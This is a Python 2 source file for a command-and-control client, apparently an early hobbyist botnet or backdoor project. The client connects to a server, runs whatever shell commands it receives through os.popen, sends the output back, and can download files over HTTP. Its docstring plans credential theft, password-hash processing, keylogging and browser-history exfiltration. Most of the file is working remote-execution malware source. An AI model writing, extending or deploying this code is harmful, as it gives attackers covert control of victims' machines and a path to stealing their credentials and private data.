#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  Client.py
#  
#  Copyright 2015 ^Graff <>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#  
#  
'''
Pseudo-Code:
#1. Start a client that reports to C&C server.
#2. Listen for incoming commands
#3. Runs commands
#4. Send results back to server.


Functionality/Features:
#1. Be able to process password hashes.
#2. Grab username and password and send them back to server.
#3. ?Keylogger
#5. Download browser history and report back to server.


TODO:
#1 Learn how to change the stdout of a subprocess.Popen object, return it, and send it down the wire.
#2. Add more of the features into the program.
'''
import socket, subprocess, sys, httplib, os

class Client():
	'''
	This Class holds all the data and Methods for a client.
	'''
	DATASIZE = 1024 #Class level Constant
	
	
	def __init__(self): #Default Constructor
		return
	
	'''
	This Method creates a client object, connects to a host, and returns the object
	'''
	def Connect(self):	
		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Socket object
		client.connect(('127.0.0.1',8080)) #connect to the host on that port
	
		return client
	
	'''
	This Method listens for data coming from the Server and returns that data.
	'''	
	def RecvData(self,sock):
		data = sock.recv(self.DATASIZE)
		return data
		
	'''
	This Method send data back to the server
	'''
	def SendData(self,sock,data):
		sock.send(data)
	
	'''
	This Method is the basis of listening for a command from the server, running that command and sending the results back to the server and listening for another command.
	'''	
	def ListenResponse(self,sock):
		while(True):
			cmd = self.RecvData(sock)
			results = self.RunCommand(cmd)
			
			self.SendData(sock,results)
	
	'''
	This Method runs the commands that come from the Server.
	'''		
	def RunCommand(self,cmd):
		
			
		results = os.popen(cmd)
		
		return results.read()
		
	def DownloadFile(self,url,file_list):
		
		files = []
		files.append(file_list)
		
		conn = httplib.HTTPConnection(url)
		
		for f in files:
			conn.request('GET','/Share/%s' % f)
			response = conn.getresponse()
			data = response.read()
			with open(f, 'wb') as downloadedFile:
				downloadedFile.write(data)
				
		conn.close()
				
		

def main(args):
	'''
	This is the Main entry point of the program. It also contains some logic.
	'''
	client = Client()
	connection = client.Connect()
	client.ListenResponse(connection)
	

if __name__ == '__main__':
    import sys
    sys.exit(main(sys.argv))
